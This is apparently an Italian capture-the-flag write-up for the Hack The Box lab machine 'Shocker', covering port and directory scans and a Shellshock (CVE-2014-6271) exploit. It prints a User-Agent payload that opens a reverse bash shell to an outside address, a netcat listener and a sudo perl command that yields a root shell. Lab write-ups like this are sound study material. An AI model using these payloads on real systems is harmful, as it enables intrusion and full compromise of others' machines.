# Shocker

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.17
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 2222:** OpenSSH 7.2p2
* **Porta 80** Apache httpd 2.4.18

```text
Nmap scan report for 10.10.10.56
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/18%OT=80%CT=1%CU=40237%PV=Y%DS=2%DC=I%G=Y%TM=65085D9
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW6%O2=M53CST11NW6%O3=M53CNNT11NW6%O4=M53CST11NW6%O5=M53CST1
OS:1NW6%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 2222 OpenSSH 7.2p2

La vulnerabilità trovata:
  * OpenSSH 2.3 < 7.7 - Username Enumeration

Questa vulnerabilità ci permette di fare username enumeration [CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473).

Non mi interessa utilizzare questa vulnerabilità per il momento, quindi proseguo.

### 2) Porta 80 Apache 2.4.18

Non trovo nulla di interessante.

### 3) Direcotory enumeration

Utilizzo il comando dirb, dal quale ottengo il seguente risultato:

```text
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 18 15:36:07 2023
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                            
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)                                          
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)                                       

-----------------
END_TIME: Mon Sep 18 15:42:00 2023
DOWNLOADED: 4612 - FOUND: 3
```

Provo con il comando gobuster utilizzando la wordlist _directory-list-2.3-medium.txt_, cercando file con estensione _sh_ e _cgi_.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi
```

Il risutlato è il seguente

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi,sh
[+] Timeout:                 10s
===============================================================
2023/09/18 16:13:31 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
```

Scarico lo script user.sh:

<p align="center">
  <img src="/Immagini/Linux-Box/Shocker/shocker-1.png" />
</p>

Facendo una rapida ricerca, basandomi sul nome della macchina, mi imbatto nella vulnerabilità shellshock. Per questo motivo utilizzo uno script nmap per verificare che il sito sia vulnerabile ad essa:

```text
nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
```

Il risultato è il seguente:


```text
Nmap scan report for 10.10.10.56
Host is up (0.080s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685
```

**Quindi è vulnerabile!**

### 4) Vulnerabilità Shellshock

Per sfruttare la vulnerabilità utilizzo la guida presente in questo [sito](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi).

Avvio burp e intercetto la richiesta _/cgi-bin/user.sh_:

<p align="center">
  <img src="/Immagini/Linux-Box/Shocker/shocker-2.png" />
</p>

Dopodichè modifico il campo _User Agent_ nel seguente modo:

```text
() { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.13/4444/ 0>&1
```
Prima di inviare la richiesta, avvio un listener sulla porta 4444:

```text
nc -nlvp 4444
```

<p align="center">
  <img src="/Immagini/Linux-Box/Shocker/shocker-5.png" width="180" height="290"/>
</p>

**SBAM! Sono dentro.**

<p align="center">
  <img src="/Immagini/Linux-Box/Shocker/shocker-3.png" />
</p>

## Privilege Escalation

Per prima cosa controllo i permessi dell'utente:

<p align="center">
  <img src="/Immagini/Linux-Box/Shocker/shocker-4.png" />
</p>

Quindi posso lanciare un comando perl come root.

Facendo una ricerca su questo [sito](https://gtfobins.github.io/gtfobins/perl/) capisco che posso elevare i miei privilegi attraverso questo comando:

```text
sudo perl -e 'exec "/bin/sh";'
```

**Eseguendolo ottengo il contenuto di root.txt**
